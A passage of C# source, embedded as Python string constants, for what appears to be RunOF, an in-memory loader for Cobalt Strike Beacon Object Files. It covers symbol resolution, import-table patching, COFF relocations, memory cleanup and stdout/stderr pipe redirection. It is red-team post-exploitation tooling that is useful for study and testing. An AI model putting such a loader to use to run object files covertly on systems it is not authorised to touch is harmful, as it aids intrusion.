					argument_buffer_length_found = true;
				}
				else if (symbol_name == this.HelperPrefix+"global_buffer_len")
				{
					var symbol_addr = new IntPtr(this.base_addr.ToInt64() + symbol.Value + this.section_headers[(int)symbol.SectionNumber - 1].PointerToRawData);
					// write the maximum size of the buffer TODO - this shouldn't be hardcoded
					Log("Found maxlen");
					Log($"\t[=] Address: {symbol_addr.ToInt64():X}");
					// CAUTION - the sizeo of what you write here MUST match the definition in beacon_funcs.h for global_buffer_maxlen (currently a uint32_t)
					Marshal.WriteInt32(symbol_addr, this.global_buffer_size);
					this.global_buffer_size_ptr = symbol_addr;
					global_buffer_len_found = true;

				}
				else if (symbol_name == this.HelperPrefix+this.EntryWrapperSymbol)
				{
					entry_addr = new IntPtr(this.base_addr.ToInt64() + symbol.Value + this.section_headers[(int)symbol.SectionNumber - 1].PointerToRawData);
					Log($"Resolved entry address ({this.HelperPrefix + this.EntryWrapperSymbol}) to {entry_addr.ToInt64():X}");
				}
				else if (symbol_name == this.HelperPrefix + "global_debug_flag") {
					var symbol_addr = new IntPtr(this.base_addr.ToInt64() + symbol.Value + this.section_headers[(int)symbol.SectionNumber - 1].PointerToRawData);


					if (debug)
					{
						Marshal.WriteInt32(symbol_addr, 1);
					} else
					{
						Marshal.WriteInt32(symbol_addr, 0);
					}
				}

			}
			if (!global_buffer_found || !global_buffer_len_found || !argument_buffer_found || !argument_buffer_length_found) throw new Exception($"Unable to find a required symbol in your helper object: global_buffer: {global_buffer_found} \nglobal_buffer_len: {global_buffer_len_found} \nargument_buffer: {argument_buffer_found} \nargument_buffer_length: {argument_buffer_length_found}");
			if (entry_addr == IntPtr.Zero) throw new Exception($"Unable to find entry point {this.HelperPrefix+this.EntryWrapperSymbol}");
			return entry_addr;
		}

		public void StitchEntry(string Entry)
		{
			IntPtr entry = new IntPtr();
			Log($"Finding our entry point ({Entry}() function)");

			foreach (var symbol in symbols)
			{

				// find the __go symbol address that represents our entry point
				if (GetSymbolName(symbol).Equals(this.HelperPrefix + Entry))
				{
					Log($"\tFound our entry symbol {this.HelperPrefix + Entry}");
					// calculate the address
					// the formula is our base_address + symbol value + section_offset
					int i = this.symbols.IndexOf(symbol);
					entry = (IntPtr)(this.base_addr.ToInt64() + symbol.Value + this.section_headers[(int)symbols[i].SectionNumber - 1].PointerToRawData); // TODO not sure about this cast 
					Log($"\tFound address {entry.ToInt64():x}");

					// now need to update our IAT with this address
					this.iat.Update(this.InternalDLLName, Entry, entry);

					break;
				}

			}

			if (entry == IntPtr.Zero)
			{
				Log($"Unable to find entry point! Does your bof have a {Entry}() function?");
				throw new Exception("Unable to find entry point");
			}

		   
		}

		internal void Clear()
		{

			// Note the global_buffer must be cleared *before* the COFF as we need to read its location from the COFF's memory
			if (this.global_buffer != IntPtr.Zero)
			{

				Log($"Zeroing and freeing loaded global buffer at 0x{this.global_buffer.ToInt64():X} with size 0x{this.global_buffer_size:X}");
				
				var output_addr = Marshal.ReadIntPtr(this.global_buffer);
				var output_size = Marshal.ReadInt32(this.global_buffer_size_ptr);

				NativeDeclarations.ZeroMemory(output_addr, output_size);
				var heap_handle = NativeDeclarations.GetProcessHeap();

				NativeDeclarations.HeapFree(heap_handle, 0, output_addr);
			}

			if (this.argument_buffer != IntPtr.Zero)
			{
				Log($"Zeroing and freeing arg buffer at 0x{this.argument_buffer.ToInt64():X} with size 0x{this.argument_buffer_size:X}");

				NativeDeclarations.ZeroMemory(this.argument_buffer, this.argument_buffer_size);
				NativeDeclarations.VirtualFree(this.argument_buffer, 0, NativeDeclarations.MEM_RELEASE);
			}

			Log($"Zeroing and freeing loaded COFF image at 0x{this.base_addr:X} with size 0x{this.size:X}");

			// Make sure mem is writeable
			foreach (var perm in this.permissions)
			{
				NativeDeclarations.VirtualProtect(perm.Addr, (UIntPtr)(perm.Size), NativeDeclarations.PAGE_READWRITE, out _);

			}
			// zero out memory
			NativeDeclarations.ZeroMemory(this.base_addr, (int)this.size);
			NativeDeclarations.VirtualFree(this.base_addr, 0, NativeDeclarations.MEM_RELEASE);


		}
		

		private bool ArchitectureCheck()
		{
			this.BofArch = this.file_header.Machine == IMAGE_FILE_MACHINE.IMAGE_FILE_MACHINE_AMD64 ? ARCH.AMD64 : ARCH.I386;

			if (this.BofArch == this.MyArch) return true;
			return false;

		}

		private void FindSections()
		{
			this.stream.Seek(Marshal.SizeOf(typeof(IMAGE_FILE_HEADER)), SeekOrigin.Begin); // the first section header is located directly after the IMAGE_FILE_HEADER
			for (int i=0; i < this.file_header.NumberOfSections; i++)
			{
				this.section_headers.Add(Deserialize<IMAGE_SECTION_HEADER>(reader.ReadBytes(Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)))));
			}

			// TODO - initialise BSS section as zero. For now, not a problem as Cobalt doesn't do this so you're told to init anything to use;
		}

		private void FindSymbols()
		{
			this.stream.Seek(this.file_header.PointerToSymbolTable, SeekOrigin.Begin);

			for (int i = 0; i < this.file_header.NumberOfSymbols; i++)
			{
				this.symbols.Add(Deserialize<IMAGE_SYMBOL>(reader.ReadBytes(Marshal.SizeOf(typeof(IMAGE_SYMBOL)))));
			}
			//Logger.Debug($"Created list of {this.symbols.Count} symbols");

		}


		private void ResolveRelocs(IMAGE_SECTION_HEADER section_header)
		{
			Log($"[Host] OS64={Environment.Is64BitOperatingSystem}, Proc64={Environment.Is64BitProcess}, IntPtr.Size={IntPtr.Size}");

			if (section_header.NumberOfRelocations > 0)
			{
				var secName = Encoding.ASCII.GetString(section_header.Name);
				Log($"[Relocs] Begin section '{secName}': count={section_header.NumberOfRelocations}, relocTable=0x{section_header.PointerToRelocations:X}, rawData=0x{section_header.PointerToRawData:X}, base=0x{this.base_addr.ToInt64():X}, arch={(IntPtr.Size == 4 ? "x86" : "x64")}");
				Log($"[Relocs] Seeking stream to reloc table @ 0x{section_header.PointerToRelocations:X} (pos was 0x{this.stream.Position:X})");
				this.stream.Seek(section_header.PointerToRelocations, SeekOrigin.Begin);
				var isX86 = (IntPtr.Size == 4);
				if (Marshal.SizeOf(typeof(IMAGE_RELOCATION)) != 10) Log($"[Relocs][WARN] IMAGE_RELOCATION size={Marshal.SizeOf(typeof(IMAGE_RELOCATION))} (expected 10). Check struct [Pack=1] and field types (WORD for Type).");

				for (int i = 0; i < section_header.NumberOfRelocations; i++)
				{
					//var struct_bytes = reader.ReadBytes(Marshal.SizeOf(typeof(IMAGE_RELOCATION)));

					int relocStructSize = Marshal.SizeOf(typeof(IMAGE_RELOCATION));
					long beforeReadPos = this.stream.Position;
					var struct_bytes = reader.ReadBytes(relocStructSize);
					if (struct_bytes == null || struct_bytes.Length != relocStructSize)
					{
						Log($"[Relocs][{i + 1}/{section_header.NumberOfRelocations}] ERROR: read {struct_bytes?.Length ?? 0}B but expected {relocStructSize}B at stream pos 0x{beforeReadPos:X}");
						throw new Exception($"Failed to read IMAGE_RELOCATION at index {i}");
					}

					IMAGE_RELOCATION reloc = Deserialize<IMAGE_RELOCATION>(struct_bytes);
					var relocAbs = (this.base_addr + (int)section_header.PointerToRawData + (int)reloc.VirtualAddress).ToInt64();
					Log($"[Relocs][{i + 1}/{section_header.NumberOfRelocations}] VA=0x{reloc.VirtualAddress:X}, SymIdx=0x{reloc.SymbolTableIndex:X}, Type={reloc.Type} (TypeRaw=0x{((ushort)reloc.Type):X4}), relocAddr=0x{relocAbs:X}");

					if ((int)reloc.SymbolTableIndex > this.symbols.Count || (int)reloc.SymbolTableIndex < 0)
					{
						Log($"[Relocs][{i + 1}] ERROR: SymbolTableIndex out of range: {reloc.SymbolTableIndex} (symbols.Count={this.symbols.Count})");
						throw new Exception($"Unable to parse relocation # {i+1} symbol table index - {reloc.SymbolTableIndex}");
					}
					IMAGE_SYMBOL reloc_symbol = this.symbols[(int)reloc.SymbolTableIndex];
					var symbol_name = GetSymbolName(reloc_symbol);
					Log($"Relocation name: {symbol_name}");
					if (reloc_symbol.SectionNumber == IMAGE_SECTION_NUMBER.IMAGE_SYM_UNDEFINED)
					{

						IntPtr func_addr;

						if (symbol_name.StartsWith(this.ImportPrefix + "Beacon") || symbol_name.StartsWith(this.ImportPrefix + "toWideChar"))
						{

							Log($"[Relocs][{i + 1}] Import type: Provided (Beacon/toWideChar). Resolving via IAT. name='{symbol_name}'");
							// we need to write the address of the IAT entry for the function to this location

							var func_name = symbol_name.Replace(this.ImportPrefix, String.Empty);
							func_addr = this.iat.Resolve(this.InternalDLLName, func_name);
							Log($"[Relocs][{i + 1}] Resolved provided func '{this.InternalDLLName}!{func_name}' -> 0x{func_addr.ToInt64():X}");

						}
						else if (symbol_name == this.ImportPrefix + this.EntrySymbol)
						{

							Log($"[Relocs][{i + 1}] Import type: EntrySymbol placeholder. Adding IAT entry for '{this.InternalDLLName}!{this.EntrySymbol}'");
							func_addr = this.iat.Add(this.InternalDLLName, this.EntrySymbol, IntPtr.Zero);
							Log($"[Relocs][{i + 1}] IAT placeholder address -> 0x{func_addr.ToInt64():X}");


						}
						else
						{

							Log($"[Relocs][{i + 1}] Import type: Win32API");

							string symbol_cleaned = symbol_name.Replace(this.ImportPrefix, "");
							string dll_name;
							string func_name;
							if (symbol_cleaned.Contains("$"))
							{

								string[] symbol_parts = symbol_name.Replace(this.ImportPrefix, "").Split(new[] { '$' }, StringSplitOptions.None);


								try
								{
									dll_name = symbol_parts[0];
									func_name = symbol_parts[1].Split(new[] { '@' }, StringSplitOptions.None)[0];
									Log($"[Relocs][{i + 1}] Parsed import '{dll_name}!{func_name}' from '{symbol_name}'");
								}
								catch (Exception e)
								{
									Log($"[Relocs][{i + 1}] ERROR parsing DLL$FUNCTION for '{symbol_name}': {e}");
									throw new Exception($"Unable to parse function name {symbol_name} as DLL$FUNCTION while processing relocations - {e}");
								}
							}
							else
							{
								dll_name = "KERNEL32";
								func_name = symbol_cleaned.Split(new[] { '@' }, StringSplitOptions.None)[0];
								Log($"[Relocs][{i + 1}] No DLL prefix, defaulting to '{dll_name}!{func_name}' (from '{symbol_name}')");

							}

							func_addr = this.iat.Resolve(dll_name, func_name);
							Log($"[Relocs][{i + 1}] Resolved API '{dll_name}!{func_name}' -> 0x{func_addr.ToInt64():X}");

						}

						// write our address to the relocation
						IntPtr reloc_location = this.base_addr + (int)section_header.PointerToRawData + (int)reloc.VirtualAddress;
						Int64 current_value = Marshal.ReadInt32(reloc_location);
						Log($"[Relocs][{i + 1}] Current value @0x{reloc_location.ToInt64():X} = 0x{current_value:X}");

						// How we write our relocation depends on the relocation type and architecture
						// Note - "in the wild" most of these are not used, which makes it a bit difficult to test. 
						// For example, in all the BOF files I've seen only four are actually used. 
						// An exception will be thrown if not supported
						// TODO - we should refactor this, but my head is hurting right now. 
						// TODO - need to check when in 64 bit mode that any 32 bit relocation's don't overflow (will .net do this for free?)

						switch (reloc.Type)
						{
#if _I386
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_ABSOLUTE:
								// The relocation is ignored
								Log($"[Relocs][{i+1}] x86 ABSOLUTE: ignored");
								break;
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_DIR16:
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_REL16:
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_SEG12:
								// The relocation is not supported;
								Log($"[Relocs][{i+1}] x86 DIR16/REL16/SEG12: not supported (no-op)");
								break;

							case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_DIR32:
								// The target's 32-bit VA.

								Marshal.WriteInt32(reloc_location, func_addr.ToInt32());
								Log($"[Relocs][{i+1}] x86 DIR32: wrote 0x{func_addr.ToInt32():X8} -> 0x{reloc_location.ToInt64():X}");
								break;



							case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_REL32:
								// TODO - not seen this "in the wild"
								Marshal.WriteInt32(reloc_location, (func_addr.ToInt32()-4) - reloc_location.ToInt32());
								break;

							case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_DIR32NB:
								// The target's 32-bit RVA.
								Marshal.WriteInt32(reloc_location, (func_addr.ToInt32() - 4) - reloc_location.ToInt32() - this.base_addr.ToInt32());
								break;

							// These relocations will fall through as unhandled for now
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_SECTION:
							// The 16-bit section index of the section that contains the target. This is used to support debugging information.
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_SECREL:
							// The 32-bit offset of the target from the beginning of its section. This is used to support debugging information and static thread local storage.
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_TOKEN:
							// The CLR token.
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_SECREL7:
							// A 7-bit offset from the base of the section that contains the target.


#elif _AMD64
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_AMD64_REL32:
								//Marshal.WriteInt32(reloc_location, (int)((func_addr.ToInt64()-4) - (reloc_location.ToInt64()))); // subtract the size of the relocation (relative to the end of the reloc)
								{
									int v = (int)((func_addr.ToInt64() - 4) - (reloc_location.ToInt64())); // subtract the size of the relocation (relative to end)
									Marshal.WriteInt32(reloc_location, v);
									Log($"[Relocs][{i + 1}] x64 REL32: wrote 0x{v:X8} -> 0x{reloc_location.ToInt64():X} (func=0x{func_addr.ToInt64():X})");
								}
								break;

#endif
							default:
								Log($"[Relocs][{i + 1}] ERROR: Unsupported import relocation type {reloc.Type}");
								throw new Exception($"Unable to process function relocation type {reloc.Type} - please file a bug report.");
					}
						Log($"[Relocs][{i + 1}] Import relocation write OK @0x{reloc_location.ToInt64():X}");


					}
					else
					{
						Log($"[Relocs][{i + 1}] Resolving internal reference");
						IntPtr reloc_location = this.base_addr + (int)section_header.PointerToRawData + (int)reloc.VirtualAddress;
						Log($"[Relocs][{i + 1}] reloc_location=0x{reloc_location.ToInt64():X}, sectionRaw=0x{section_header.PointerToRawData:X}, relocVA=0x{reloc.VirtualAddress:X}");
#if _I386
						Int32 current_value = Marshal.ReadInt32(reloc_location);
						Int32 object_addr;

#elif _AMD64

						Log("About to define INT vars!!!!!!!!!!!");
						Int64 current_value = Marshal.ReadInt64(reloc_location);
						Int32 current_value_32 = Marshal.ReadInt32(reloc_location);
						Int64 object_addr;
						Log("MADE IT PAST SETTING INT VARIABLES!!!!!!!!!!!!!!");
					   
#endif
						Log($"[Relocs][{i + 1}] Current internal value = 0x{current_value:X}");
						Log($"Relocation type: {reloc.Type}");
						switch (reloc.Type)
						{
#if _I386
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_ABSOLUTE:
								// The relocation is ignored
								break;
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_DIR16:
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_REL16:
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_SEG12:
								// The relocation is not supported;
								break;

							case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_DIR32:
								// The target's 32-bit VA
								Marshal.WriteInt32(reloc_location, current_value + this.base_addr.ToInt32() + (int)this.section_headers[(int)reloc_symbol.SectionNumber - 1].PointerToRawData);
								break;

							case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_REL32:
								// The target's 32-bit RVA
								object_addr = current_value + this.base_addr.ToInt32() + (int)this.section_headers[(int)reloc_symbol.SectionNumber - 1].PointerToRawData;
								Marshal.WriteInt32(reloc_location, (object_addr-4) - reloc_location.ToInt32() );
								break;


							case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_DIR32NB:
								// The target's 32-bit RVA.
								object_addr = current_value + (int)this.section_headers[(int)reloc_symbol.SectionNumber - 1].PointerToRawData;
								Marshal.WriteInt32(reloc_location, (object_addr - 4) - reloc_location.ToInt32());
								break;

							// These relocations will fall through as unhandled for now
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_SECTION:
							// The 16-bit section index of the section that contains the target. This is used to support debugging information.
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_SECREL:
							// The 32-bit offset of the target from the beginning of its section. This is used to support debugging information and static thread local storage.
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_TOKEN:
							// The CLR token.
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_SECREL7:
							// A 7-bit offset from the base of the section that contains the target.
#elif _AMD64
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_AMD64_ABSOLUTE:
								// The relocation is ignored
								Log($"[Relocs][{i + 1}] x64 ABSOLUTE: ignored");
								break;
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_AMD64_ADDR64:
								// The 64-bit VA of the relocation target.
								//Marshal.WriteInt64(reloc_location, current_value + this.base_addr.ToInt64() + (int)this.section_headers[(int)reloc_symbol.SectionNumber - 1].PointerToRawData);
								{
									long v = current_value + this.base_addr.ToInt64() + (int)this.section_headers[(int)reloc_symbol.SectionNumber - 1].PointerToRawData;
									Marshal.WriteInt64(reloc_location, v);
									Log($"[Relocs][{i + 1}] x64 ADDR64 (internal): wrote 0x{v:X16} -> 0x{reloc_location.ToInt64():X}");
								}

								break;
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_AMD64_ADDR32:
								// The 32-bit VA of the relocation target.
								// TODO how does this not overflow?
								object_addr = current_value_32 + this.base_addr.ToInt64() + (int)this.section_headers[(int)reloc_symbol.SectionNumber - 1].PointerToRawData;
								{
									int v = (int)(object_addr);
									Marshal.WriteInt32(reloc_location, v);
									Log($"[Relocs][{i + 1}] x64 ADDR32 (internal): wrote 0x{v:X8} -> 0x{reloc_location.ToInt64():X}");
								}

								break;
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_AMD64_ADDR32NB:
								// The 32-bit address without an image base (RVA).
								object_addr = current_value_32 + (int)this.section_headers[(int)reloc_symbol.SectionNumber - 1].PointerToRawData;
								{
									int v = (int)(object_addr - reloc_location.ToInt64());
									Marshal.WriteInt32(reloc_location, v);
									Log($"[Relocs][{i + 1}] x64 ADDR32NB (internal): wrote 0x{v:X8} -> 0x{reloc_location.ToInt64():X}");
								}
								break;
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_AMD64_REL32:
								// The 32-bit relative address from the byte following the relocation.
								object_addr = current_value_32 + this.base_addr.ToInt64() + (int)this.section_headers[(int)reloc_symbol.SectionNumber - 1].PointerToRawData;
								{
									int v = (int)((object_addr - 4) - (reloc_location.ToInt64())); // subtract the size of the relocation
									Marshal.WriteInt32(reloc_location, v);
									Log($"[Relocs][{i + 1}] x64 REL32 (internal): wrote 0x{v:X8} -> 0x{reloc_location.ToInt64():X} (obj=0x{object_addr:X})");
								}

								break;
								//_1 through _5 written from the spec, not seen in the wild to test
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_AMD64_REL32_1:
								// The 32-bit address relative to byte distance 1 from the relocation.
								object_addr = current_value_32 + this.base_addr.ToInt64() + (int)this.section_headers[(int)reloc_symbol.SectionNumber - 1].PointerToRawData;
								{
									int v = (int)((object_addr - 3) - (reloc_location.ToInt64()));
									Marshal.WriteInt32(reloc_location, v);
									Log($"[Relocs][{i + 1}] x64 REL32_1: wrote 0x{v:X8} -> 0x{reloc_location.ToInt64():X}");
								}
								break;
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_AMD64_REL32_2:
								// The 32-bit address relative to byte distance 2 from the relocation.
								object_addr = current_value_32 + this.base_addr.ToInt64() + (int)this.section_headers[(int)reloc_symbol.SectionNumber - 1].PointerToRawData;
								{
									int v = (int)((object_addr - 2) - (reloc_location.ToInt64()));
									Marshal.WriteInt32(reloc_location, v);
									Log($"[Relocs][{i + 1}] x64 REL32_2: wrote 0x{v:X8} -> 0x{reloc_location.ToInt64():X}");
								}
								break;
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_AMD64_REL32_3:
								// The 32-bit address relative to byte distance 3 from the relocation.
								object_addr = current_value_32 + this.base_addr.ToInt64() + (int)this.section_headers[(int)reloc_symbol.SectionNumber - 1].PointerToRawData;
								{
									int v = (int)((object_addr - 1) - (reloc_location.ToInt64()));
									Marshal.WriteInt32(reloc_location, v);
									Log($"[Relocs][{i + 1}] x64 REL32_3: wrote 0x{v:X8} -> 0x{reloc_location.ToInt64():X}");
								}

								break;
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_AMD64_REL32_4:
								// The 32-bit address relative to byte distance 4 from the relocation.
								object_addr = current_value_32 + this.base_addr.ToInt64() + (int)this.section_headers[(int)reloc_symbol.SectionNumber - 1].PointerToRawData;
								{
									int v = (int)((object_addr) - (reloc_location.ToInt64()));
									Marshal.WriteInt32(reloc_location, v);
									Log($"[Relocs][{i + 1}] x64 REL32_4: wrote 0x{v:X8} -> 0x{reloc_location.ToInt64():X}");
								}

								break;
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_AMD64_REL32_5:
								// The 32-bit address relative to byte distance 5 from the relocation.
								object_addr = current_value_32 + this.base_addr.ToInt64() + (int)this.section_headers[(int)reloc_symbol.SectionNumber - 1].PointerToRawData;
								{
									int v = (int)((object_addr + 1) - (reloc_location.ToInt64()));
									Marshal.WriteInt32(reloc_location, v);
									Log($"[Relocs][{i + 1}] x64 REL32_5: wrote 0x{v:X8} -> 0x{reloc_location.ToInt64():X}");
								}
								break;
							// These feel like they're unlikely to be used. I've never seen them, and some of them don't make a lot of sense in the context of what we're doing.
							// Ghidra/IDA don't implement all of these either
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_AMD64_SECTION:
								// The 16-bit section index of the section that contains the target. This is used to support debugging information.
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_AMD64_SECREL:
								// The 32-bit offset of the target from the beginning of its section. This is used to support debugging information and static thread local storage.
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_AMD64_SECREL7:
								// A 7-bit unsigned offset from the base of the section that contains the target.
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_AMD64_TOKEN:
								// CLR tokens.
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_AMD64_SREL32:
								// A 32-bit signed span-dependent value emitted into the object.
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_AMD64_PAIR:
								// A pair that must immediately follow every span-dependent value.
							case IMAGE_RELOCATION_TYPE.IMAGE_REL_AMD64_SSPAN32:
								// A 32-bit signed span-dependent value that is applied at link time.
#endif

							default:
								Log($"[Relocs][{i + 1}] ERROR: Unhandled internal relocation type {reloc.Type}");
								throw new Exception($"Unhandled relocation type {reloc.Type} - please file a bug report");

						}
						Log($"[Relocs][{i + 1}] Internal relocation write OK @0x{reloc_location.ToInt64():X}");
					}   

				}

			}
		}
			 
		private string GetSymbolName(IMAGE_SYMBOL symbol)
		{
			if (symbol.Name[0] == 0 && symbol.Name[1] == 0 && symbol.Name[2] == 0 && symbol.Name[3] == 0) 
			{
				// the last four bytes of the Name field contain an offset into the string table.
				uint offset = BitConverter.ToUInt32(symbol.Name, 4);
				long position = this.stream.Position;
				this.stream.Seek(this.string_table + offset, SeekOrigin.Begin);

				// read a C string 
				List<byte> characters = new List<byte>();
				byte c;
				while ((c = reader.ReadByte()) != '\0')
				{
					characters.Add(c);
				}

				String output = Encoding.ASCII.GetString(characters.ToArray());
				this.stream.Seek(position, SeekOrigin.Begin);
				return output;

			} else
			{
				return Encoding.ASCII.GetString(symbol.Name).Replace("\0", String.Empty);
			} 

		}

		private static T Deserialize<T> (byte[] array) 
			where T:struct
		{
			GCHandle handle = GCHandle.Alloc(array, GCHandleType.Pinned);
			return (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
		}


	}

	class Permissions
	{
		internal IntPtr Addr;
		internal uint Characteristics;
		internal int Size;
		internal String SectionName;

		public Permissions(IntPtr addr, uint characteristics, int size, String section_name)
		{
			this.Addr = addr;
			this.Characteristics = characteristics;
			this.Size = size;
			this.SectionName = section_name;
		}
	}
}

"""

FILEDESCRIPTORREDIRECTOR_CS = """
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace RunOF.Internals
{
	class FileDescriptorPair
	{
		public IntPtr Read { get; set; }

		public IntPtr Write { get; set; }
	}

	class FileDescriptorRedirector
	{
		private const int STD_INPUT_HANDLE = -10;
		private const int STD_OUTPUT_HANDLE = -11;
		private const int STD_ERROR_HANDLE = -12;
		private const uint BYTES_TO_READ = 1024;


		private IntPtr oldGetStdHandleOUT;
		private IntPtr oldGetStdHandleIN;
		private IntPtr oldGetStdHandleERROR;

		private FileDescriptorPair kpStdOutPipes;
		private FileDescriptorPair kpStdInPipes;
		private Task<string> readTask;

		public bool RedirectFileDescriptors()
		{
			oldGetStdHandleOUT = GetStdHandleOUT();
			oldGetStdHandleIN = GetStdHandleIN();
			oldGetStdHandleERROR = GetStdHandleERROR();

#if DEBUG
			Console.WriteLine("[*] Creating STDOut Pipes to redirect to");
#endif
			kpStdOutPipes = CreateFileDescriptorPipes();
			if (kpStdOutPipes == null)
			{
				return false;
			}

#if DEBUG
			Console.WriteLine("[*] Creating STDIn Pipes to redirect to");
#endif
			kpStdInPipes = CreateFileDescriptorPipes();
			if (kpStdInPipes == null)
			{
				return false;
			}

			return RedirectDescriptorsToPipes(kpStdOutPipes.Write, kpStdInPipes.Write, kpStdOutPipes.Write);
		}

		public string ReadDescriptorOutput()
		{
#if DEBUG
			Console.WriteLine("[*] Retrieving the 'subprocess' stdout & stderr");
#endif
			while (!readTask.IsCompleted)
			{
#if DEBUG
				Console.WriteLine("[*] Waiting for the task reading from pipe to finish...");
#endif
				Thread.Sleep(2000);
			}
			return readTask.Result;
		}

		public void ResetFileDescriptors()
		{
#if DEBUG
			Console.WriteLine("[*] Reset StdError, StdOut, StdIn");
#endif
			RedirectDescriptorsToPipes(oldGetStdHandleOUT, oldGetStdHandleIN, oldGetStdHandleERROR);

			ClosePipes();

		}

		private static IntPtr GetStdHandleOUT()
		{
			return NativeDeclarations.GetStdHandle(STD_OUTPUT_HANDLE);
		}
		private static IntPtr GetStdHandleERROR()
		{
			return NativeDeclarations.GetStdHandle(STD_ERROR_HANDLE);
		}

		internal void ClosePipes()
		{
#if DEBUG
			Console.WriteLine("[*] Closing StdOut pipes");
#endif
			CloseDescriptors(kpStdOutPipes);
#if DEBUG
			Console.WriteLine("[*] Closing StdIn pipes");
#endif
			CloseDescriptors(kpStdInPipes);
		}

		internal void StartReadFromPipe()
		{
			this.readTask = Task.Factory.StartNew(() =>
			{
				string output = "";

				byte[] buffer = new byte[BYTES_TO_READ];
				byte[] outBuffer;

				var ok = NativeDeclarations.ReadFile(kpStdOutPipes.Read, buffer, BYTES_TO_READ, out uint bytesRead, IntPtr.Zero);

				if (!ok)
				{
					Console.WriteLine($"[-] Unable to read from 'subprocess' pipe");
					return "";
				}
#if DEBUG
				Console.WriteLine($"[*] Read {bytesRead} bytes from 'subprocess' pipe");
#endif
				if (bytesRead != 0)
				{
					outBuffer = new byte[bytesRead];
					Array.Copy(buffer, outBuffer, bytesRead);
					output += Encoding.Default.GetString(outBuffer);
				}

				while (ok)
				{
					ok = NativeDeclarations.ReadFile(kpStdOutPipes.Read, buffer, BYTES_TO_READ, out bytesRead, IntPtr.Zero);
#if DEBUG
					Console.WriteLine($"[*] Read {bytesRead} bytes from 'subprocess' pipe");
#endif
					if (bytesRead != 0)
					{
						outBuffer = new byte[bytesRead];
						Array.Copy(buffer, outBuffer, bytesRead);
						output += Encoding.Default.GetString(outBuffer);
					}
				}
				return output;
			});
		}

		private static IntPtr GetStdHandleIN()
		{
			return NativeDeclarations.GetStdHandle(STD_INPUT_HANDLE);
		}

		private static void CloseDescriptors(FileDescriptorPair stdoutDescriptors)
		{
			// Need to close write before read else it hangs as could still be writing
			if (stdoutDescriptors.Write != IntPtr.Zero)
			{
				NativeDeclarations.CloseHandle(stdoutDescriptors.Write);
#if DEBUG
				Console.WriteLine("[+] CloseHandle write");
#endif
			}

			if (stdoutDescriptors.Read != IntPtr.Zero)
			{
				NativeDeclarations.CloseHandle(stdoutDescriptors.Read);
#if DEBUG
				Console.WriteLine("[+] CloseHandle read");
#endif
			}
		}

		private static FileDescriptorPair CreateFileDescriptorPipes()
		{
			NativeDeclarations.SECURITY_ATTRIBUTES lpSecurityAttributes = new NativeDeclarations.SECURITY_ATTRIBUTES();
			lpSecurityAttributes.nLength = Marshal.SizeOf(lpSecurityAttributes);
			lpSecurityAttributes.bInheritHandle = 1;

			var outputStdOut = NativeDeclarations.CreatePipe(out IntPtr read, out IntPtr write, ref lpSecurityAttributes, 0);
			if (!outputStdOut)
			{
#if DEBUG

				Console.WriteLine("[-] Cannot create File Descriptor pipes");
#endif
				return null;
			}
#if DEBUG
			else
			{
				Console.WriteLine("[+] Created File Descriptor pipes: ");
				Console.WriteLine($"\t[*] Read: 0x{read.ToString("X")}");
				Console.WriteLine($"\t[*] Write: 0x{write.ToString("X")}");
			}
#endif
			return new FileDescriptorPair
			{
				Read = read,
				Write = write
			};
		}

		private static bool RedirectDescriptorsToPipes(IntPtr hStdOutPipes, IntPtr hStdInPipes, IntPtr hStdErrPipes)
		{
			bool bStdOut = NativeDeclarations.SetStdHandle(STD_OUTPUT_HANDLE, hStdOutPipes);
			if (bStdOut)
			{
#if DEBUG
				Console.WriteLine($"[+] SetStdHandle STDOUT to 0x{hStdOutPipes.ToInt64():X} ");
			}
			else
			{
				Console.WriteLine($"[-] Unable to SetStdHandle STDOUT to 0x{hStdOutPipes.ToInt64():X} ");
				return false;
#endif
			}

			bool bStdError = NativeDeclarations.SetStdHandle(STD_ERROR_HANDLE, hStdErrPipes);
			if (bStdError)
			{
#if DEBUG
				Console.WriteLine($"[+] SetStdHandle STDERROR to 0x{hStdErrPipes.ToInt64():X}");
			}
			else
			{
				Console.WriteLine($"[-] Unable to SetStdHandle STDERROR  to 0x{hStdErrPipes.ToInt64():X} ");
				return false;
#endif
			}

